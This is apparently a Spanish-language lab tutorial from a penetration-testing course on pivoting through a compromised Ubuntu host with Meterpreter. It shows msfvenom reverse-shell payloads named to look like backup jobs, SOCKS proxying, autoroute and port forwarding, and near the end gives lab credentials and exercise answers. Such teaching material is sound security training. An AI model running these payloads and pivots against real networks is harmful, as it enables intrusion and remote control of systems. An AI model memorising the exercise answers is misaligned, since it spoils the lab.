
# Meterpreter Tunneling & Port Forwarding

Ahora consideremos un escenario en el que tenemos acceso al shell de Meterpreter en el servidor Ubuntu (el host pivote) y queremos realizar escaneos de enumeración a través del host pivote, pero nos gustaría aprovechar las ventajas que nos brindan las sesiones de Meterpreter . En tales casos, aún podemos crear un pivote con nuestra sesión de Meterpreter sin depender del reenvío de puertos SSH. Podemos crear un shell Meterpreter para el servidor Ubuntu con el siguiente comando, que devolverá un shell en nuestro host de ataque en el puerto `8080`.

### **Creación de Payload para Ubuntu Pivot Host**

```shell-session
afsh4ck@kali$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

Antes de copiar la carga útil, podemos iniciar un [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/) , también conocido como controlador de carga útil genérico.

### **Configuración e inicio del multi/handler**

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

Podemos copiar el archivo binario `backupjob` al host pivote de Ubuntu `sobre SSH` y ejecutarlo para obtener una sesión de Meterpreter.

### **Ejecutar el payload en el host pivote**

```shell-session
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

Necesitamos asegurarnos de que la sesión de Meterpreter se establezca correctamente al ejecutar la carga útil.

### **Establecer de sesión de Meterpreter**

```bash
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```

Sabemos que el objetivo de Windows está en la red `172.16.5.0/23`. Entonces, suponiendo que el firewall en el destino de Windows permite solicitudes ICMP, querríamos realizar un barrido de ping en esta red. Podemos hacerlo usando Meterpreter con el módulo `ping_sweep`, que generará el tráfico ICMP desde el host de Ubuntu a la red `172.16.5.0/23`.

### **Ping Sweep (Barrido de ping)**

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

También podríamos realizar un barrido de ping utilizando un `for loop` en un host pivote de destino que hará ping a cualquier dispositivo en el rango de red que especifiquemos. Aquí hay dos frases ingeniosas de bucle de barrido de ping útiles que podríamos usar para hosts de pivote basados ​​en Linux y Windows.

**Ping Sweep For Loop en hosts pivotantes de Linux**

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

**Barrido de ping para bucle usando CMD**

```bash
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**Barrido de ping con PowerShell**

```bash
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

{% hint style="info" %}
**Nota**: Es posible que un barrido de ping no dé como resultado respuestas exitosas en el primer intento, especialmente cuando se comunica a través de redes. Esto puede deberse al tiempo que le toma a un host construir su caché arp. En estos casos, es bueno intentar nuestro barrido de ping al menos dos veces para garantizar que se construya el caché arp.
{% endhint %}

Podría haber escenarios en los que el firewall de un host bloquee el ping (ICMP) y el ping no nos proporcione respuestas exitosas. En estos casos podemos realizar un escaneo TCP en la red 172.16.5.0/23 con Nmap. En lugar de usar SSH para el reenvío de puertos, también podemos usar el módulo de enrutamiento post-explotación de Metasploit `socks_proxy` para configurar un proxy local en nuestro host de ataque. Configuraremos el proxy SOCKS para `SOCKS version 4a`. Esta configuración de SOCKS iniciará un oyente en el puerto `9050` y enrutará todo el tráfico recibido a través de nuestra sesión de Meterpreter.

**Configuración del proxy SOCKS de MSF**

```bash
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

**Confirmar que el servidor proxy se está ejecutando**

```bash
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

Después de iniciar el servidor SOCKS, configuraremos cadenas proxy para enrutar el tráfico generado por otras herramientas como Nmap a través de nuestro pivote en el host Ubuntu comprometido. Podemos agregar la siguiente línea al final de nuestro  archivo `proxychains.conf` ubicado en `/etc/proxychains.conf`si aún no está allí.

**Agregar una línea a proxychains.conf si es necesario**

```shell-session
socks4 	127.0.0.1 9050
```

{% hint style="info" %}
**Nota**: Dependiendo de la versión que esté ejecutando el servidor SOCKS, es posible que ocasionalmente necesitemos cambiar socks4 a socks5 en proxychains.conf.
{% endhint %}

Finalmente, necesitamos decirle a nuestro módulo socks\_proxy que enrute todo el tráfico a través de nuestra sesión de Meterpreter. Podemos usar el módulo de Metasploit `post/multi/manage/autoroute` para agregar rutas para la subred 172.16.5.0 y luego enrutar todo el tráfico de nuestras cadenas de proxy.

### **Crear rutas con AutoRoute**

```bash
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

También es posible agregar rutas con `autoroute` ejecutando autoroute desde la sesión de Meterpreter.

```bash
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

Después de agregar las rutas necesarias, podemos usar la opción `-p` para enumerar las rutas activas para asegurarnos de que nuestra configuración se aplique como se esperaba.

### **Listado de rutas activas con AutoRoute**

```bash
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

Como puede ver en el resultado anterior, la ruta se agregó a la red 172.16.5.0/23. Ahora podremos usar  proxychains para enrutar nuestro tráfico de Nmap a través de nuestra sesión de Meterpreter.

**Prueba de funcionalidad de enrutamiento y proxy**

```shell-session
afsh4ck@kali$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

***

## <mark style="color:purple;">Port Forwarding</mark>

El reenvío de puertos también se puede lograr utilizando el módulo de Meterpreter `portfwd`. Podemos habilitar un listener en nuestro host de ataque y solicitar a Meterpreter que reenvíe todos los paquetes recibidos en este puerto a través de nuestra sesión de Meterpreter a un host remoto en la red `172.16.5.0/23`.

### **Opciones de portwf**

```bash
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

### **Creación de retransmisión TCP local**

```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

El comando anterior solicita a la sesión de Meterpreter que inicie un listener en el puerto local de nuestro host de ataque ( `-l`) `3300`y reenvíe todos los paquetes al servidor Windows remoto (`-r`) `172.16.5.19`en el puerto ( `-p`) `3389` a través de nuestra sesión de Meterpreter. Ahora, si ejecutamos xfreerdp en nuestro localhost:3300, podremos crear una sesión de escritorio remoto.

### **Conexión al Target Windows a través de localhost**

```shell-session
afsh4ck@kali$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

**Salida de Netstat**

Podemos usar Netstat para ver información sobre la sesión que establecimos recientemente. Desde una perspectiva defensiva, podemos beneficiarnos del uso de Netstat si sospechamos que un host ha sido comprometido. Esto nos permite ver cualquier sesión que haya establecido un anfitrión.

```shell-session
afsh4ck@htb[/htb]$ netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```

***

## <mark style="color:purple;">Reverse Port Forwarding con Meterpreter</mark>

De manera similar a los reenvíos de puertos locales, Metasploit también puede funcionar con `reverse port forwarding`. Iniciaremos un oyente en un nuevo puerto en nuestro host de ataque para Windows y solicitaremos al servidor Ubuntu que reenvíe todas las solicitudes recibidas al servidor Ubuntu en el puerto `1234`a nuestro oyente en el puerto `8081`.

Podemos crear un puerto inverso hacia adelante en nuestro shell existente del escenario anterior usando el siguiente comando. Este comando reenvía todas las conexiones en el puerto `1234`que se ejecuta en el servidor Ubuntu a nuestro host de ataque en el puerto local ( `-l`) `8081`. También configuraremos nuestro oyente para escuchar en el puerto 8081 para un shell de Windows.

### **Reglas de Reverse Port Forwarding**

```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

### **Configuración e inicio de multi/handler**

```bash
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

Ahora podemos crear un payload de reverse shell que enviará una conexión de regreso a nuestro servidor Ubuntu en `172.16.5.129:1234` cuando se ejecute en nuestro host de Windows. Una vez que nuestro servidor Ubuntu reciba esta conexión, la reenviará a `IP-ATACANTE:8081` que configuramos.

### **Generando el Payload de Windows**

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Finalmente, si ejecutamos nuestra carga útil en el host de Windows, deberíamos poder recibir un shell de Windows pivotado a través del servidor Ubuntu.

### **Estableciendo la sesión de Meterpreter**

```shell-session
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.64.137 con usuario " ubuntu " y contraseña " HTB_@cademy_stdnt! "
```

### <mark style="color:purple;">Pregunta 1</mark>

¿Qué dos direcciones IP se pueden descubrir al intentar realizar un barrido de ping desde el host pivote de Ubuntu? (Formato: xxxx,xxxx)

#### Creamos el Payload para el Pivot Host

```basic
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.205 -f elf -o backupjob LPORT=8080
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

#### Iniciamos un Multi Handler con Metasploit

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

#### Envio del payload y ejecución

Nos enviamos el payload al servidor de pivote y lo ejecutamos. Automáticamente se nos devolverá una conexión de Meterpreter a nuestro multi handler:

<figure><img src="/files/4KojV9loGTg7JJrEV4cT" alt=""><figcaption></figcaption></figure>

#### Ping Sweep

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
[+] 	172.16.5.19 host found
[+] 	172.16.5.129 host found
```

Obtenemos correctamente las 2 IP´s

### <mark style="color:purple;">Pregunta 2</mark>

¿Cuál de las rutas que agrega AutoRoute permite que se pueda acceder a 172.16.5.19 desde el host del ataque? (Formato: xxxx/xxxx)

```bash
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.64.137
[*] Use the -p option to list all active routes
meterpreter > 
```

Ya tenemos la ruta: `172.16.5.0/255.255.254.0`
